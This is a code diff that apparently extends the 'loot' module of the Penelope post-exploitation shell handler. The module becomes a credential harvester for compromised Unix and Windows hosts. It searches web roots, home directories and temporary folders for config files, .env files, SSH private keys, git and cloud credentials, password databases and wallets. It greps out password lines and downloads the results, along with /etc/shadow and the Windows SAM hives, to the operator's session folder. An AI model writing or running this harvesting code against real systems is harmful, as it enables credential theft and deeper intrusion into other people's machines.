@@ -4770,9 +4770,65 @@ class loot(Module):
 	def run(session, args):
 		"""
 		Automatically collect sensitive files from the target system
+
+		Comprehensive scanner for low-privilege users (www-data, regular users)
+		targeting web applications, databases, and service configuration files.
+
+		Usage:
+		  run loot                    # Full scan and download all found files
+		  run loot --scan-only        # Scan only, show results without downloading
+		  run loot --depth 5          # Increase directory depth (default: 3)
+
+		What it scans:
+		  • Web Frameworks: WordPress, Laravel, Django, Drupal, Joomla configs
+		  • Database Credentials: MySQL, PostgreSQL, MongoDB, Redis configs
+		  • Environment Files: .env, .env.local, .env.production
+		  • SSH Keys: id_rsa, *.pem, *.ppk (checks if private key)
+		  • Git Repositories: .git/config (extracts embedded credentials)
+		  • Docker: docker-compose.yml, Dockerfile, .dockerenv
+		  • Cloud: AWS credentials, GCP, Azure config files
+		  • Backups: *.bak, *.old, *.backup files with sensitive content
+		  • API Keys: apikey*, api_key*, token* patterns
+
+		Search locations (prioritizes low-privilege accessible paths):
+		  • /var/www, /srv/www - Web root directories
+		  • /home/*/public_html - User web directories
+		  • /tmp, /var/tmp - Temporary directories
+		  • /opt, /usr/local - Application directories
+		  • Current working directory (if in web/app path)
+
+		Content analysis:
+		  • Searches for DB_PASSWORD, DATABASE_URL in config files
+		  • Extracts and displays found credentials in real-time
+		  • Identifies private SSH keys automatically
+		  • Detects Git repository credentials
+
+		Examples:
+		  run loot                    # Standard use: scan everything and download
+		  run loot --scan-only        # Preview what would be found (no download)
+		  run loot --depth 1          # Quick surface scan
+		  run loot --depth 6          # Deep scan (may take longer)
+
+		Output:
+		  Downloaded files saved to: ~/.penelope/sessions/<hostname>-<ip>-<os>/
+
+		Options:
+		  --scan-only    Only scan for files, don't download (useful for recon)
+		  --depth N      Directory traversal depth (default: 3, range: 1-10)
 		"""
+		import argparse
+		parser = argparse.ArgumentParser(prog='loot', add_help=False)
+		parser.add_argument('--scan-only', action='store_true', help='Only scan for files, do not download')
+		parser.add_argument('--depth', type=int, default=3, help='Directory traversal depth (default: 3)')
+
+		try:
+			parsed_args = parser.parse_args(args.split() if args else [])
+		except SystemExit:
+			return
+
 		if session.OS == 'Unix':
-			targets = [
+			# Predefined target patterns (high privilege)
+			predefined_targets = [
 				'/etc/passwd',
 				'/etc/shadow',
 				'/etc/group',
@@ -4790,12 +4846,402 @@ class loot(Module):
 				'/etc/apache2/.htpasswd',
 				'/root/.mysql_history'
 			]
-			logger.info("Collecting sensitive files...")
-			files_str = ' '.join(targets)
+
+			# Comprehensive sensitive filename patterns
+			sensitive_patterns = [
+				# Generic sensitive patterns
+				'*password*',
+				'*passwd*',
+				'*credential*',
+				'*secret*',
+				'*token*',
+				'*auth*',
+
+				# Crypto/Keys
+				'*.pem',
+				'*.key',
+				'*.p12',
+				'*.pfx',
+				'*.crt',
+				'*.cer',
+				'*.csr',
+				'id_rsa*',
+				'id_dsa*',
+				'id_ecdsa*',
+				'id_ed25519*',
+				'*.ppk',
+
+				# Environment & Config files
+				'.env',
+				'.env.*',
+				'*.env',
+				'config.php',
+				'configuration.php',
+				'config.inc.php',
+				'db-config.php',
+				'database.php',
+				'settings.php',
+				'local_settings.py',
+				'settings.py',
+				'config.py',
+				'database.yml',
+				'database.yaml',
+				'config.yml',
+				'config.yaml',
+				'application.yml',
+				'application.properties',
+				'config.json',
+				'config.ini',
+				'*.conf',
+
+				# WordPress
+				'wp-config.php',
+				'wp-config.php.save',
+				'wp-config.php.bak',
+				'wp-config.php.old',
+				'wp-config.old',
+
+				# Drupal
+				'settings.php',
+				'settings.local.php',
+
+				# Joomla
+				'configuration.php',
+
+				# Laravel
+				'.env',
+				'.env.example',
+				'.env.local',
+				'.env.production',
+				'.env.development',
+				'database.php',
+
+				# Django
+				'settings.py',
+				'local_settings.py',
+				'production.py',
+				'development.py',
+
+				# Node.js
+				'.npmrc',
+				'.yarnrc',
+				'package.json',
+				'package-lock.json',
+				'.git-credentials',
+
+				# Database configs
+				'my.cnf',
+				'.my.cnf',
+				'mysqld.cnf',
+				'postgresql.conf',
+				'pg_hba.conf',
+				'.pgpass',
+				'mongod.conf',
+				'redis.conf',
+
+				# Web servers
+				'.htpasswd',
+				'.htaccess',
+				'httpd.conf',
+				'apache2.conf',
+				'nginx.conf',
+				'sites-available',
+				'sites-enabled',
+
+				# Git
+				'.git-credentials',
+				'.gitconfig',
+
+				# Cloud & API
+				'credentials',
+				'.aws',
+				'.s3cfg',
+				'.boto',
+				'gcloud',
+				'.azure',
+				'api_key*',
+				'apikey*',
+
+				# Backups & SQL
+				'*.sql',
+				'*.sql.gz',
+				'*.sql.zip',
+				'*.sql.bak',
+				'*backup*.sql',
+				'*database*.sql',
+				'*dump*.sql',
+				'*.db',
+				'*.sqlite',
+				'*.sqlite3',
+
+				# VPN
+				'*.ovpn',
+				'*.conf',
+
+				# Password managers
+				'*.kdbx',
+				'*.kdb',
+
+				# Crypto wallets
+				'*.wallet',
+				'wallet.dat',
+
+				# Docker
+				'docker-compose.yml',
+				'docker-compose.yaml',
+				'.dockerenv',
+				'Dockerfile',
+
+				# Kubernetes
+				'kubeconfig',
+				'.kube',
+
+				# History files
+				'.bash_history',
+				'.zsh_history',
+				'.sh_history',
+				'.mysql_history',
+				'.psql_history',
+				'.pgpass',
+				'.mongorc.js',
+				'.dbshell',
+
+				# Application specific
+				'*.log',
+				'error.log',
+				'access.log',
+				'debug.log',
+
+				# FTP/SFTP
+				'*.ftpconfig',
+				'sftp-config.json',
+
+				# Email
+				'*.mbox',
+				'*.eml'
+			]
+
+			logger.info("Scanning for sensitive files on Unix system...")
+			logger.info("Focusing on low-privilege accessible locations (web apps, user directories)...")
+
+			# Comprehensive search paths - prioritize low-privilege accessible areas
+			search_paths = [
+				# Web application directories (www-data accessible)
+				'/var/www',
+				'/var/www/html',
+				'/usr/share/nginx',
+				'/srv/www',
+				'/srv/http',
+				'/home/*/public_html',
+				'/home/*/www',
+
+				# Application directories
+				'/opt',
+				'/usr/local',
+				'/var/opt',
+
+				# User directories
+				'/home',
+				'/home/*',
+
+				# Temporary and upload directories
+				'/tmp',
+				'/var/tmp',
+				'/dev/shm',
+				'/var/www/html/uploads',
+				'/var/www/html/temp',
+
+				# Common CMS/Framework paths
+				'/var/www/html/wp-content',
+				'/var/www/wordpress',
+				'/var/www/html/sites/default',
+
+				# Application configs (often world-readable)
+				'/etc',
+
+				# Log directories (sometimes readable)
+				'/var/log',
+
+				# Root (try anyway)
+				'/root'
+			]
+
+			found_files = []
+
+			# Get current user to determine privilege level
+			current_user = session.exec("whoami", value=True).strip()
+			logger.info(f"Current user: {current_user}")
+
+			# Detect current working directory
+			cwd = session.exec("pwd", value=True).strip()
+			logger.info(f"Current directory: {cwd}")
+
+			# Add current directory to search paths if it's interesting
+			if any(x in cwd for x in ['/var/www', '/home', '/opt', '/srv', '/app', '/web']):
+				if cwd not in search_paths:
+					search_paths.insert(0, cwd)
+					logger.info(f"Added current directory to search paths: {cwd}")
+
+			for search_path in search_paths:
+				# Check if path exists
+				check_cmd = f"[ -d {search_path} ] && echo exists"
+				if not session.exec(check_cmd, value=True).strip():
+					continue
+
+				logger.info(f"Searching in {search_path}...")
+
+				# Build find command with all patterns
+				pattern_args = []
+				for i, pattern in enumerate(sensitive_patterns):
+					if i > 0:
+						pattern_args.append('-o')
+					pattern_args.extend(['-iname', f"'{pattern}'"])
+
+				find_cmd = f"find {search_path} -maxdepth {parsed_args.depth} -type f \\( {' '.join(pattern_args)} \\) 2>/dev/null | head -100"
+				result = session.exec(find_cmd, value=True)
+
+				if result:
+					files = [f.strip() for f in result.split('\n') if f.strip()]
+					found_files.extend(files)
+					if files:
+						logger.info(f"Found {len(files)} file(s) in {search_path}")
+
+			# Additional content-based search for database credentials
+			logger.info("\nSearching for database credentials in config files...")
+			db_patterns = [
+				'DB_PASSWORD',
+				'DB_USER',
+				'DB_HOST',
+				'DATABASE_URL',
+				'MYSQL_PASSWORD',
+				'POSTGRES_PASSWORD',
+				'MONGODB_URI',
+				'REDIS_PASSWORD',
+				'define.*DB_PASSWORD',
+				'define.*DB_USER',
+				'mysqli_connect',
+				'mysql_connect',
+				'PDO.*mysql',
+				'psycopg2.connect',
+				'MongoClient'
+			]
+
+			# Search in accessible web directories
+			accessible_dirs = ['/var/www', '/home', '/opt', '/srv', '/tmp', cwd]
+			config_files_with_creds = []
+
+			for dir_path in accessible_dirs:
+				check_cmd = f"[ -d {dir_path} ] && echo exists"
+				if not session.exec(check_cmd, value=True).strip():
+					continue
+
+				for pattern in db_patterns:
+					grep_cmd = f"grep -r -l -i '{pattern}' {dir_path} --include='*.php' --include='*.py' --include='*.js' --include='*.yml' --include='*.yaml' --include='*.json' --include='*.conf' --include='*.ini' --include='*.env' 2>/dev/null | head -50"
+					result = session.exec(grep_cmd, value=True)
+					if result:
+						files = [f.strip() for f in result.split('\n') if f.strip()]
+						config_files_with_creds.extend(files)
+
+			config_files_with_creds = sorted(set(config_files_with_creds))
+
+			if config_files_with_creds:
+				logger.info(f"[+] Found {len(config_files_with_creds)} files containing database credentials:")
+				for f in config_files_with_creds[:50]:
+					print(f"    {f}")
+					# Try to grep the actual credentials
+					grep_cred = f"grep -i -E '(password|passwd|pwd|secret).*=|define.*PASSWORD' '{f}' 2>/dev/null | head -5"
+					creds = session.exec(grep_cred, value=True)
+					if creds:
+						for line in creds.split('\n')[:3]:
+							if line.strip():
+								print(f"      → {line.strip()}")
+				found_files.extend(config_files_with_creds)
+
+			# Search for .git directories (potential credential leakage)
+			logger.info("\nSearching for .git repositories...")
+			git_search = "find /var/www /home /opt /srv /tmp -name '.git' -type d 2>/dev/null | head -20"
+			git_dirs = session.exec(git_search, value=True)
+			if git_dirs:
+				git_list = [g.strip() for g in git_dirs.split('\n') if g.strip()]
+				logger.info(f"[+] Found {len(git_list)} .git repositories:")
+				for git in git_list:
+					print(f"    {git}")
+					# Check for .git/config (may contain credentials)
+					git_config = f"{git}/config"
+					found_files.append(git_config)
+					# Check for credentials in git config
+					git_cred_check = f"grep -i 'url.*@' '{git_config}' 2>/dev/null"
+					creds = session.exec(git_cred_check, value=True)
+					if creds:
+						print(f"      → Credentials found: {creds.strip()}")
+
+			# Search for Docker environment files
+			logger.info("\nSearching for Docker configurations...")
+			docker_search = "find /var/www /home /opt /srv /tmp -name 'docker-compose.yml' -o -name 'docker-compose.yaml' -o -name '.env' -o -name 'Dockerfile' 2>/dev/null | head -50"
+			docker_files = session.exec(docker_search, value=True)
+			if docker_files:
+				docker_list = [d.strip() for d in docker_files.split('\n') if d.strip()]
+				logger.info(f"[+] Found {len(docker_list)} Docker-related files:")
+				for df in docker_list:
+					print(f"    {df}")
+				found_files.extend(docker_list)
+
+			# Search for SSH keys in accessible locations
+			logger.info("\nSearching for SSH keys...")
+			ssh_search = "find /var/www /home /opt /srv /tmp -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | head -30"
+			ssh_keys = session.exec(ssh_search, value=True)
+			if ssh_keys:
+				ssh_list = [s.strip() for s in ssh_keys.split('\n') if s.strip()]
+				logger.info(f"[+] Found {len(ssh_list)} SSH keys:")
+				for key in ssh_list:
+					print(f"    {key}")
+					# Check if private key
+					key_check = f"head -1 '{key}' 2>/dev/null | grep -i 'private'"
+					if session.exec(key_check, value=True).strip():
+						print(f"      → PRIVATE KEY!")
+				found_files.extend(ssh_list)
+
+			# Search for backup files
+			logger.info("\nSearching for backup files...")
+			backup_search = "find /var/www /home /opt /srv /tmp -type f \\( -name '*.bak' -o -name '*.old' -o -name '*.backup' -o -name '*~' -o -name '*.save' \\) 2>/dev/null | head -50"
+			backup_files = session.exec(backup_search, value=True)
+			if backup_files:
+				backup_list = [b.strip() for b in backup_files.split('\n') if b.strip() and any(x in b.lower() for x in ['config', 'password', 'wp-', 'database', 'settings', '.env'])]
+				if backup_list:
+					logger.info(f"[+] Found {len(backup_list)} interesting backup files:")
+					for bf in backup_list:
+						print(f"    {bf}")
+					found_files.extend(backup_list)
+
+			# Remove duplicates and sort
+			found_files = sorted(set(found_files))
+
+			if found_files:
+				logger.info(f"\n[+] TOTAL: Found {len(found_files)} sensitive file(s)")
+			else:
+				logger.info("No additional sensitive files found during scan")
+
+			if parsed_args.scan_only:
+				logger.info("Scan-only mode, skipping download")
+				return
+
+			# Collect predefined targets
+			logger.info("\nCollecting predefined sensitive files...")
+			files_str = ' '.join(predefined_targets)
 			session.download(files_str)
 
+			# Download found files (in batches to avoid command line length limits)
+			if found_files:
+				logger.info(f"Downloading {len(found_files)} scanned file(s)...")
+				batch_size = 50
+				for i in range(0, len(found_files), batch_size):
+					batch = found_files[i:i+batch_size]
+					files_str = ' '.join(f"'{f}'" for f in batch)
+					session.download(files_str)
+
 		elif session.OS == 'Windows':
-			targets = [
+			# Predefined Windows targets
+			predefined_targets = [
 				'C:\\Windows\\System32\\config\\SAM',
 				'C:\\Windows\\System32\\config\\SYSTEM',
 				'C:\\Windows\\System32\\config\\SECURITY',
@@ -4805,9 +5251,93 @@ class loot(Module):
 				'C:\\inetpub\\wwwroot\\web.config',
 				'%APPDATA%\\FileZilla\\*.xml'
 			]
-			logger.info("Collecting sensitive files...")
-			for target in targets:
+
+			# Sensitive filename patterns
+			sensitive_patterns = [
+				'*password*',
+				'*passwd*',
+				'*credential*',
+				'*secret*',
+				'*.pem',
+				'*.key',
+				'*.p12',
+				'*.pfx',
+				'*.env',
+				'web.config',
+				'*.config',
+				'*.conf',
+				'*.ini',
+				'*.ovpn',
+				'*.sql',
+				'*.kdbx',
+				'*.wallet',
+				'*.ppk',
+				'*.rdp',
+				'*vnc*.ini',
+				'unattend.xml',
+				'sysprep.inf'
+			]
+
+			logger.info("Scanning for sensitive files on Windows system...")
+
+			# Search in common locations
+			search_paths = [
+				'C:\\Users',
+				'C:\\inetpub',
+				'C:\\xampp',
+				'C:\\wamp',
+				'C:\\Program Files',
+				'C:\\ProgramData',
+				'%APPDATA%',
+				'%LOCALAPPDATA%',
+				'%TEMP%'
+			]
+
+			found_files = []
+
+			for search_path in search_paths:
+				logger.info(f"Searching in {search_path}...")
+
+				for pattern in sensitive_patterns:
+					# Use PowerShell for more reliable searching
+					if session.subtype == 'psh':
+						ps_cmd = f"Get-ChildItem -Path '{search_path}' -Filter '{pattern}' -Recurse -Depth {parsed_args.depth} -File -ErrorAction SilentlyContinue | Select-Object -First 50 -ExpandProperty FullName"
+						result = session.exec(ps_cmd, value=True)
+					else:
+						# Fallback to dir for cmd
+						cmd = f'dir /s /b /a-d "{search_path}\\{pattern}" 2>nul'
+						result = session.exec(cmd, value=True)
+
+					if result:
+						files = [f.strip() for f in result.split('\n') if f.strip()]
+						found_files.extend(files)
+
+			# Remove duplicates and sort
+			found_files = sorted(set(found_files))
+
+			if found_files:
+				logger.info(f"\n[+] Found {len(found_files)} sensitive file(s):")
+				for f in found_files[:100]:  # Limit display
+					print(f"    {f}")
+				if len(found_files) > 100:
+					logger.info(f"    ... and {len(found_files) - 100} more")
+			else:
+				logger.info("No additional sensitive files found during scan")
+
+			if parsed_args.scan_only:
+				logger.info("Scan-only mode, skipping download")
+				return
+
+			# Collect predefined targets
+			logger.info("\nCollecting predefined sensitive files...")
+			for target in predefined_targets:
 				session.download(target)
+
+			# Download found files
+			if found_files:
+				logger.info(f"Downloading {len(found_files)} scanned file(s)...")
+				for f in found_files:
+					session.download(f)
 		else:
 			logger.error("Unsupported OS")
 
